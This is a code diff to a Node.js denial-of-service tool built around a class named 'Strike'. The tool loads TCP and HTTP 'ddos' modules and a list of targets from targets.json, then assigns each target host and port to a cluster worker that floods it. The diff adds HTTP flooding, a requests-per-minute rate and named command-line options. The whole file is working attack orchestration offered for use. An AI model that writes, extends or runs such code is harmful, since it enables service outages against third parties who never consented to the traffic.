@@ -10,23 +10,27 @@ const { socks5 } = require("./proxy.socks5");
 const EventEmitter = require("events");
 const ProxyChecker = require("./proxyChecker");
 const TcpClient = require("./modules/tcp.ddos.module");
+const HttpClient = require("./modules/http.ddos.module");
 const targets = require("./targets.json");
 
 class Strike {
-  #protocol = "";
+  #protocol = "tcp";
   #CPUsCount = 0;
   #ms = 1000;
+  #rpm = 10;
 
-  constructor(protocol, ms, CPUsCount) {
+  constructor(protocol, ms, CPUsCount, rpm) {
     this.counter = 0;
     this.eventEmitter = new EventEmitter();
     this.proxyChecker = new ProxyChecker();
     this.#ms = ms;
     this.#CPUsCount = CPUsCount;
+    this.#protocol = protocol;
+    this.#rpm = rpm;
   }
 
   async init() {
-    const numCPUs = this.#CPUsCount || targets.data.tcp.length;
+    const numCPUs = this.#CPUsCount || targets.data[this.#protocol].length;
     let i = 0;
 
     if (cluster.isPrimary) {
@@ -35,7 +39,7 @@ class Strike {
       }
 
       for (const worker of Object.values(cluster.workers)) {
-        const { host, port } = targets.data.tcp[i];
+        const { host, port } = targets.data[this.#protocol][i];
         worker.send({ host, port });
         // worker.send({ host: "127.0.0.1", port: 23 });
         i++;
@@ -49,8 +53,11 @@ class Strike {
       });
     } else if (cluster.isWorker) {
       process.on("message", (data) => {
-        const tcpClient = new TcpClient(data.host, data.port, this.#ms);
-        tcpClient.init();
+        if(this.#protocol === "tcp") {
+          new TcpClient(data.host, data.port, this.#ms, this.#rpm).init();
+        } else {
+          new HttpClient(data.host, data.port, this.#ms, this.#protocol).init();
+        }
       });
       console.info("[Info]: Init instance, process id:", process.pid);
     }
@@ -70,7 +77,21 @@ class Strike {
 
 }
 
+function prepareArgument(title) {
+  const [ result ] = process.argv.filter(item => item.includes(title));
+
+  if(!result) {
+    return "";
+  }
+
+  return result.split("=")[1] || "";
+}
+
 (function () {
-  const [,, protocol, ms, CPUsCount] = process.argv;
-  new Strike(protocol, ms, CPUsCount).init();
+  const protocol = prepareArgument("protocol");
+  const ms = prepareArgument("ms");
+  const streams = prepareArgument("streams");
+  const rpm = prepareArgument("rpm");
+
+  new Strike(protocol, ms, streams, rpm).init();
 })();
